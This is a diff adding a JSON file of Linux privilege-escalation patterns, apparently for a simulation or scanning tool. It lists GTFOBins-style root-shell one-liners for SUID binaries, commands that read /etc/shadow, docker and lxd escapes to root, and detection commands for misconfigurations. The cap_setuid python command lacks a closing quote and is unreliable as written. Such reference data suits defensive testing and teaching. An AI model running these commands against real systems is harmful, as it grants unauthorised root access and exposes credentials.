@@ -1,0 +1,150 @@
+{
+  "version": "1.0.0",
+  "description": "Privilege escalation patterns for simulation",
+  "suid_binaries": [
+    {
+      "binary": "/usr/bin/find",
+      "escalation_cmd": "find . -exec /bin/sh \\; -quit",
+      "description": "find SUID bit allows execution as owner (often root)",
+      "severity": "CRITICAL",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/find/"
+    },
+    {
+      "binary": "/usr/bin/vim",
+      "escalation_cmd": "vim -c ':!/bin/sh'",
+      "description": "vim SUID bit enables spawning shell as file owner",
+      "severity": "CRITICAL",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/vim/"
+    },
+    {
+      "binary": "/usr/bin/nmap",
+      "escalation_cmd": "nmap --interactive > !sh",
+      "description": "Old nmap versions with SUID allow arbitrary command execution",
+      "severity": "HIGH",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/nmap/"
+    },
+    {
+      "binary": "/usr/bin/python",
+      "escalation_cmd": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
+      "description": "Python SUID escapes to shell with effective UID",
+      "severity": "CRITICAL",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/python/"
+    },
+    {
+      "binary": "/usr/bin/perl",
+      "escalation_cmd": "perl -e 'exec \"/bin/sh\";'",
+      "description": "Perl SUID allows arbitrary command execution",
+      "severity": "HIGH",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/perl/"
+    },
+    {
+      "binary": "/bin/bash",
+      "escalation_cmd": "bash -p",
+      "description": "Bash with SUID allows privileged shell (-p flag preserves privileges)",
+      "severity": "CRITICAL",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/bash/"
+    },
+    {
+      "binary": "/usr/bin/cp",
+      "escalation_cmd": "cp /etc/shadow /tmp/shadow; chmod 777 /tmp/shadow",
+      "description": "cp SUID allows reading/overwriting root-owned files",
+      "severity": "HIGH",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/cp/"
+    },
+    {
+      "binary": "/usr/bin/curl",
+      "escalation_cmd": "curl file:///etc/shadow",
+      "description": "curl SUID enables reading privileged files",
+      "severity": "MEDIUM",
+      "gtfobin": "https://gtfobins.github.io/gtfobins/curl/"
+    }
+  ],
+  "misconfigurations": [
+    {
+      "type": "writable_passwd",
+      "description": "/etc/passwd is world-writable — direct root account manipulation possible",
+      "command_to_detect": "ls -la /etc/passwd",
+      "severity": "CRITICAL"
+    },
+    {
+      "type": "docker_group",
+      "description": "User is member of docker group — trivial escape to root via docker run",
+      "command_to_detect": "id | grep docker",
+      "severity": "CRITICAL",
+      "escalation": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+    },
+    {
+      "type": "sudo_nopasswd",
+      "description": "sudo allowed without password (NOPASSWD) for all commands",
+      "command_to_detect": "sudo -l",
+      "severity": "CRITICAL",
+      "escalation": "sudo /bin/bash"
+    },
+    {
+      "type": "cron_writable",
+      "description": "Cron job script is world-writable — inject reverse shell",
+      "command_to_detect": "find /etc/cron* -writable 2>/dev/null",
+      "severity": "HIGH"
+    },
+    {
+      "type": "weak_nfs",
+      "description": "NFS share exported with no_root_squash — mount and copy SUID shell",
+      "command_to_detect": "cat /etc/exports",
+      "severity": "HIGH"
+    },
+    {
+      "type": "tmp_writable_path",
+      "description": "/tmp is in PATH before system directories — DLL/binary hijacking",
+      "command_to_detect": "echo $PATH",
+      "severity": "MEDIUM"
+    },
+    {
+      "type": "lxd_group",
+      "description": "User is member of lxd group — container escape to root",
+      "command_to_detect": "id | grep lxd",
+      "severity": "CRITICAL",
+      "escalation": "lxc init ubuntu:18.04 privesc -c security.privileged=true"
+    },
+    {
+      "type": "sudo_env_keep",
+      "description": "sudo preserves LD_PRELOAD via env_keep — library injection to root",
+      "command_to_detect": "sudo -l | grep LD_PRELOAD",
+      "severity": "CRITICAL"
+    },
+    {
+      "type": "writeable_service",
+      "description": "Service binary running as root is world-writable",
+      "command_to_detect": "find /etc/systemd/system -writable",
+      "severity": "CRITICAL"
+    },
+    {
+      "type": "capability_python",
+      "description": "Python has cap_setuid capability — immediate root",
+      "command_to_detect": "getcap -r / 2>/dev/null",
+      "severity": "CRITICAL",
+      "escalation": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")"
+    }
+  ],
+  "weak_file_permissions": [
+    {
+      "path": "/etc/shadow",
+      "expected": "640",
+      "description": "Shadow file readable by non-root users — offline password cracking"
+    },
+    {
+      "path": "/root/.ssh/id_rsa",
+      "expected": "600",
+      "description": "Root SSH private key accessible — direct root SSH login"
+    },
+    {
+      "path": "/etc/sudoers",
+      "expected": "440",
+      "description": "Sudoers file writable — add current user to unlimited sudo"
+    },
+    {
+      "path": "/var/log/auth.log",
+      "expected": "640",
+      "description": "Auth log readable — credential pattern analysis"
+    }
+  ]
+}
